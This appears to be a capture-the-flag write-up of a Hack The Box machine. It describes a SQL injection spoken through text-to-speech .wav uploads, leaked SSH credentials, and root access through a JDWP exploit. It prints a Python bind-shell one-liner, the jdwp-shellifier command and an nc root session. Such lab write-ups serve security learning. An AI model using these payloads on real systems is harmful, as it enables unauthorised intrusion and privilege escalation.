## Quick Summary

Finally, I'm posting the walk-through of this box, currently, I'm preparing my OSCP so most of my free time goes dedicated to it :D.
At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.

This was a box where for the foothold, you needed to upload a .wav file with a sql injection to get the reverse shell (the .wav is interpreted by an AI), and for the root you needed to exploit [JWDP](https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html), the idea of using an AI for the foothold, was original kudos for that, but the implementation of it, and the multiple tries-error with different [TTS](https://en.wikipedia.org/wiki/Speech_synthesis) I didn't like it, in summary, was a box I didn't feel like learning something new at all.

Said that, time to get our hands dirty.

## Nmap

As always the enumeration starts by running Nmap:

```console
# Nmap 7.80 scan initiated Wed Dec 11 15:33:30 2019 as: nmap -sC -sV -O -o nmap-ai.htb 10.10.10.163

Which discovers SSH and HTTP (Apache 2.4.29 as the server) open.

## Web enumeration

The home page just shows "Artificial Intelligence" and has some interactive menus, in one of them, is announced about an AI the company is developing, which can identify what's being told in it, so is possible to upload a file to server, this is already a way to go as is possible to upload a reverse shell.
Some enumeration of it is carried.

{% include figure image_path="/assets/images/htb/ai/1.1-web.png" %}

{% include figure image_path="/assets/images/htb/ai/1.1-web-php-1.png" %}

{% include figure image_path="/assets/images/htb/ai/1.1-web-php-2.png" %}

{% include figure image_path="/assets/images/htb/ai/1.1-web-php-3.png" %}

Is given a try to create a .wav file from text (text -> .mp3 -> .wav), upload it and see what happens, the result is an exception which gives a hint: there is access to a mysql database, which means will be possible to do an sql injection.

{% include figure image_path="/assets/images/htb/ai/1.1-web-rce-1.png" %}

{% include figure image_path="/assets/images/htb/ai/1.1-web-rce-2.png" %}

## Foothold

A step to make an sql injection was carried in the same way than before for the RCE, which resulted in nothing, based on that gobuster was run against AI to see if there was some web page that could give hints in HOW to properly write the sql injection for it being interpreted by the AI.

```console

```

As is possible to see above, ```intelligence.php``` was discovered, once that page is accessed, is found a guide on how to write some queries to the AI:

{% include figure image_path="/assets/images/htb/ai/2.1-rce-2.png" %}

After a LOT of try-error (literally, I was never able to go beyond this if it wasn't for the help of [Interep](https://www.hackthebox.eu/profile/10423) of both queries and different TTS (being I'm not a native english speaker and neither I have a microphone), was used in the end [Text 2 Speech](https://www.text2speech.org/):

{% include figure image_path="/assets/images/htb/ai/t2s.png" %}

getting as final SQL Injection the next:

```
User:
Open single quote union select, username from users Comment Database
Password:
Open single quote union select, password from users Comment Database
```

Once it's respective .wav files generate by the TTS mentioned above were uploaded, the following were the results:

{% include figure image_path="/assets/images/htb/ai/command-ok-1.png" %}

{% include figure image_path="/assets/images/htb/ai/command-ok-2.png" %}


Then, was tried to login via ssh with the credentials:

```
user: alexa
passwd: H,Sq9t6}a<)?q93_
```

Getting a success:

```console
root@kali:~/Documents/HTB/boxes/medium/linux/ai# ssh alexa@10.10.10.163

```

then an ssh tunnel with ```ssh -L 8080:localhost:8080 alexa@10.10.10.163``` was run to know which service it was, resulting in tomcat:

{% include figure image_path="/assets/images/htb/ai/tomcat-tunnel.png" %}

Checked the process runing, is possible to see that tomcat is being executed with root user and [JDWP](https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html) enabled:

```console
root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
```

A quick search google gives a result the next [exploit](https://www.exploit-db.com/exploits/46501)

Then to use that exploit a ```bind.sh``` is created under ```/tmp``` with the next code:

```python
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"
```

So, it will bind a shell in the port 2222, after it the exploit is run using that script:

```console
alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd /tmp/bind.sh 
[+] Targeting '127.0.0.1:8000'

[+] Runtime.exec() successful, retId=6f0
[!] Command successfully executed
```

Done that, is tried to get a connection to the server with nc to the server in port specified in ```bind.sh``` getting root access with it:

```console
root@kali:~/Documents/HTB/boxes/medium/linux/ai# nc -v 10.10.10.163 2222
ai.lnx.htb [10.10.10.163] 2222 (?) open

bash: no job control in this shell
root@AI:~# wc -c /root/root.txt
wc -c /root/root.txt
33 /root/root.txt
```

Done, we have root access and the root.txt flag :D.

This was so far one of the boxes I didn't like at all, thanks to the esoteric-ish foothold it had, I didn't end with a feeling of learning something at all after doing this box, anyway, that's all, later I'm planning to start blogging current adventure into preparing OSCP, stay tuned for it.
